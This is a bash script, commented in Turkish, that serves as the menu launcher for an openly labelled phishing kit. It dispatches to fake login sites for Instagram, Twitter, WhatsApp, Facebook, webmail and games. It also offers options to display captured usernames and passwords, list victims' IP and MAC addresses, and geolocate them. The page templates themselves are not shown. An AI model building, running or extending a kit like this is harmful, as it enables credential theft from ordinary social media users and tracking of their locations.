#!/bin/bash
#!/bin/sh
#Code:Gokhan Yakut
#Siber güvenlik & Yazlım Geliştircisi
#İnstagram : @gokhan_yakut_04
#Youtube : bygokhanyakut

clear

# Yeni banner fonksiyonu
custom_banner() {
    echo -e "\033[32;1m"
    echo "  ______   ______  __    __ __    __  ______  __    __      __      __  ______  __    __ __    __ ________ "
    echo " /      \ /      \|  \  /  \  \  |  \/      \|  \  |  \    |  \    /  \/      \|  \  /  \  \  |  \        \ "
    echo "|  ▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓ /  ▓▓ ▓▓  | ▓▓  ▓▓▓▓▓▓\ ▓▓\ | ▓▓     \▓▓\  /  ▓▓  ▓▓▓▓▓▓\ ▓▓ /  ▓▓ ▓▓  | ▓▓\▓▓▓▓▓▓▓▓"
    echo "| ▓▓ __\▓▓ ▓▓  | ▓▓ ▓▓/  ▓▓| ▓▓__| ▓▓ ▓▓__| ▓▓ ▓▓▓\| ▓▓      \▓▓\/  ▓▓| ▓▓__| ▓▓ ▓▓/  ▓▓| ▓▓  | ▓▓  | ▓▓   "
    echo "| ▓▓|    \ ▓▓  | ▓▓ ▓▓  ▓▓ | ▓▓    ▓▓ ▓▓    ▓▓ ▓▓▓▓\ ▓▓       \▓▓  ▓▓ | ▓▓    ▓▓ ▓▓  ▓▓ | ▓▓  | ▓▓  | ▓▓   "
    echo "| ▓▓ \▓▓▓▓ ▓▓  | ▓▓ ▓▓▓▓▓\ | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓▓▓▓ ▓▓\▓▓ ▓▓        \▓▓▓▓  | ▓▓▓▓▓▓▓▓ ▓▓▓▓▓\ | ▓▓  | ▓▓  | ▓▓   "
    echo "| ▓▓__| ▓▓ ▓▓__/ ▓▓ ▓▓ \▓▓\| ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓ \▓▓▓▓        | ▓▓   | ▓▓  | ▓▓ ▓▓ \▓▓\| ▓▓__/ ▓▓  | ▓▓   "
    echo " \▓▓    ▓▓\▓▓    ▓▓ ▓▓  \▓▓\ ▓▓  | ▓▓ ▓▓  | ▓▓ ▓▓  \▓▓▓        | ▓▓   | ▓▓  | ▓▓ ▓▓  \▓▓\\▓▓    ▓▓  | ▓▓   "
    echo "  \▓▓▓▓▓▓  \▓▓▓▓▓▓ \▓▓   \▓▓\▓▓   \▓▓\▓▓   \▓▓\▓▓   \▓▓         \▓▓    \▓▓   \▓▓\▓▓   \▓▓ \▓▓▓▓▓▓    \▓▓   "
    echo -e "\033[0m"
    echo -e "\033[34;1m Siber Güvenlik & Yazılım Geliştircisi \033[0m"  #
    echo -e "\n\033[33;1m Sosyal Medya Bağlantılarımız: \033[0m"
    echo -e "\033[36;1m Instagram: \033[35m https://instagram.com/Gokhan_yakut_04"
    echo -e "\033[36;1m Youtube: \033[35m https://www.youtube.com/@byGokhanYakut"
    echo -e "\033[36;1m Twitter: \033[35m https://twitter.com/bygokhanYakut"
    echo -e "\033[36;1m GitHub: \033[35m https://github.com/bygokhanyakut"
    echo -e "\033[36;1m Whatsapp: \033[35m https://wa.me/+44 7833 319922\033[0m"
}

# Yardım menüsü fonksiyonu
show_help() {
    echo -e "
    --help & --h   (Yardım Menüsünü Çağırır)
    --ıp & --ip    (Giriş Yapmış Kişilerin IP Adresini Listeler)
    --user         (Giriş Yapılmış Username & Password)
    --mac          (Giriş Yapanların MAC Adresleri)
    --location     (Belirtilen IP Adresinin Yer Tespiti)
    bash yaman.sh & sh yaman.sh (Phishing Toolunu Çalıştırır)
    "
}

# Banner'ı görüntüle ve işlem numarasını al
show_banner_and_get_action() {
    custom_banner
    echo -e "\033[35mİşlem Seçenekleri:\033[0m"
    echo -e "\033[31m[01]\e[32m Instagram       \033[31m[04]\e[32m Facebook"
    echo -e "\033[31m[02]\e[32m Twitter         \033[31m[05]\e[32m Mail (Gmail, Yandex, Hotmail)"
    echo -e "\033[31m[03]\e[32m Whatsapp        \033[31m[06]\e[32m Game (Oyunlar)"
    echo -e "\033[31m[00] Şifre Göster"
    echo -e "\033[31m[99] Çıkış"
    read -p "İşlem Numarası: " islem
}

# Ana işlem fonksiyonu
perform_action() {
    case $1 in
        1|01)
            sleep 1
            clear
            cd Site/Instagram/
            bash start.sh
            ;;
        2|02)
            sleep 1
            clear
            cd Site/Twitter/
            bash start.sh
            ;;
        3|03)
            sleep 1
            clear
            cd Site/Whatsapp/
            bash start.sh
            ;;
        4|04)
            sleep 1
            clear
            cd Site/Facebook/
            bash start.sh
            ;;
        5|05)
            sleep 1
            clear
            cd Site/Mail/
            bash start.sh
            ;;
        6|06)
            sleep 1
            clear
            cd Site/Game/
            bash start.sh
            ;;
        00)
            clear
            cd Site/
            bash code.sh
            ;;
        99)
            exit 1
            ;;
        *)
            echo -e '\033[36;40;1m Girdiğiniz işlem numarasını kontrol ediniz....'	
            sleep 1
            clear 
            show_banner_and_get_action
            ;;
    esac
}

# Yardım menüsünü kontrol et
if [[ $1 == "--help" || $1 == "--h" ]]; then
    show_help
else
    show_banner_and_get_action
    perform_action $islem
fi
